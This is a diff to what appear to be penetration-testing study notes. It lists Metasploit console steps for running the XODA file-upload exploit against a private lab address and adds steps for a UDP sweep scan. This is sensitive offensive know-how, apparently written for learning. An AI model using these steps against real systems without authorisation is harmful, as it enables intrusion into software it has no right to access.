@@ -65,8 +65,16 @@ An Auxiliary Module is a type of module within a system that includes exploits w
 
 **Exploiting XODA-Device (what we just curled)**
 - `search Xoda`
-- `run exploit/unix/webapp/xoda_file_upload`
+- `use exploit/unix/webapp/xoda_file_upload`
 - `show options`
 - `set RHOST 192.168.20.3`
 - set Path on the Xoda device to root: `set TARGETURI /`
 - run our exploit: `exploit`
+- leave module: `back`
+
+**Run udp_sweep**
+- `search udP_sweep`
+- `run auxiliary/scanner/discovery/udp_sweep`
+- `show options`
+- `set RHOST 192.168.20.3`
+- `run`
